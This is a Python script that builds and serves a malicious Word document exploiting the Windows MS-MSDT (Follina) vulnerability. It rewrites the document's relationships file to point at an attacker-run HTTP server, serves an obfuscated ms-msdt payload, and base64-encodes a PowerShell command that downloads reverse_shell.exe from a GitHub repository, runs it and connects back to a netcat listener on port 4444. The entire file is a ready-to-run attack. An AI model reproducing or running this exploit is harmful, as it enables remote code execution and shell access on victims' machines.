#!/usr/bin/env python3
import zipfile, tempfile, shutil, os, random, base64, string, socket
import http.server, socketserver, threading
from ipaddress import IPv4Address

# Resolve local IP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]
s.close()

PORT = 8000
REV_PORT = 4444

# folder
staging = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
shutil.copytree("doc", os.path.join(staging, "doc"))

# Inject external reference to our HTTP server
with open(os.path.join(staging, "doc", "word", "_rels", "document.xml.rels")) as f:
    rels = f.read().replace("{staged_html}", f"http://{ip}:{PORT}/index.html")
with open(os.path.join(staging, "doc", "word", "_rels", "document.xml.rels"), "w") as f:
    f.write(rels)

# maldoc
shutil.make_archive("exploit.doc", "zip", os.path.join(staging, "doc"))
os.rename("exploit.doc.zip", "exploit.doc")
print(f"[+] Created: exploit.doc")

# donw shell
cmd = "Invoke-WebRequest https://raw.githubusercontent.com/HoangTPMAFK/c-ransomware/main/victim/reverse_shell.exe -OutFile C:\\Windows\\Tasks\\rev.exe; C:\\Windows\\Tasks\\rev.exe -e cmd.exe " + ip + " " + str(REV_PORT)
b64 = base64.b64encode(cmd.encode()).decode()

# MS-MSDT payload
html = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{b64}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
html += "".join(random.choices(string.ascii_lowercase, k=4096)) + "\n</script>"

# Serve HTTP
os.makedirs(os.path.join(staging, "www"), exist_ok=True)
with open(os.path.join(staging, "www", "index.html"), "w") as f:
    f.write(html)

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=os.path.join(staging, "www"), **kwargs)

srv = socketserver.TCPServer(("", PORT), Handler)
print(f"[+] HTTP server on :{PORT}")
print(f"[+] Waiting for victim to open exploit.doc...")
threading.Thread(target=srv.serve_forever, daemon=True).start()
os.system(f"nc -lvnp {REV_PORT}")